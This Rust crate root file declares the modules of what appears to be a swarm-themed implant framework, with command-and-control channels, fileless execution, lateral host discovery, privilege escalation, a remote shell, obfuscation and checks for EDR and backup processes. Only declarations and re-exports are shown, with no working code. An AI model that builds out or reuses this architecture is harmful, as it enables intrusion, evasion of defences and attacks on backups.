pub mod arena_mgr;
pub mod c2_bridge;
pub mod c2_channels;
pub mod chaos;
pub mod comms;
pub mod config;
pub mod consensus;
pub mod crypto;
pub mod did;
pub mod federation;
pub mod fileless;
pub mod guardian;
pub mod hibernation;
pub mod hive_scale;
pub mod hivemind;
pub mod homomorphic;
pub mod identity;
pub mod ipc_contract;
pub mod lateral;
pub mod ldc;
pub mod marl_online;
pub mod ml;
pub mod obfstr;
pub mod opsec;
pub mod panal;
pub mod pheromone;
pub mod phoenix;
pub mod platform_layer;
pub mod privesc;
pub mod remote_shell;
pub mod royal_jelly;
pub mod shared_arena;
pub mod smoke_signals;
pub mod stigmergy;
pub mod swarming;
pub mod syscalls;
pub mod system_info;
pub mod task_poller;
pub mod telemetry;
pub mod tournament;
pub mod utils;
pub mod waggle_dance;
pub mod whispernet;

pub use comms::HiveChamber;
pub use consensus::ConsensusEngine;
pub use crypto::{
    colony_key, decrypt_chacha20, decrypt_model, derive_key, derive_seed, encrypt_chacha20,
};
pub use fileless::MemfdBinary;
pub use identity::AgentIdentity;
pub use lateral::discover_hosts;
pub use ldc::{Decision, Message, Payload, Role, SignedMessage, Value};
pub use phoenix::{AgentBlueprint, ColonyGenome, GenomeFragment};
pub use privesc::{PrivEscResult, PrivEscVector, RiskLevel};
pub use remote_shell::{
    execute_command, execute_command_with_timeout, CommandResult, ExecSession, WsShell,
};
pub use system_info::{
    is_backup_process, is_edr_process, LinuxInfo, PlatformInfo, SystemInfo, WindowsInfo,
};
